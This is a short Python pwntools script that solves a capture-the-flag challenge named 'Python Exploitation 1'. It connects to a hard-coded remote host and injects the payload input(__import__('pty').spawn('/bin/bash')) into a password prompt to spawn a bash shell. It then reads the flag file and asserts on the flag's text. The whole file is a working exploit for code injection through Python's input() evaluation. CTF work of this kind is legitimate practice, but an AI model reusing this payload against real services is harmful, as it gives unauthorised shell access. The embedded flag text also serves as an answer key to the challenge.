#! /usr/bin/env python3
##
# Created for the Python Exploitation 1 challenge
# By Amos Ng
##
from pwn import *


payload = "input(__import__('pty').spawn('/bin/bash'))"
t = remote("104.131.90.29", 8006)

# Send payload
t.recvuntil("Enter the password: ")
t.sendline(payload)

# Try to get flag
t.sendline("cat *flag*")
flag = t.recvline_contains("next").decode()

assert "next one will be more than just input exploitation" in flag
print("Flag: %s" % flag)
t.interactive()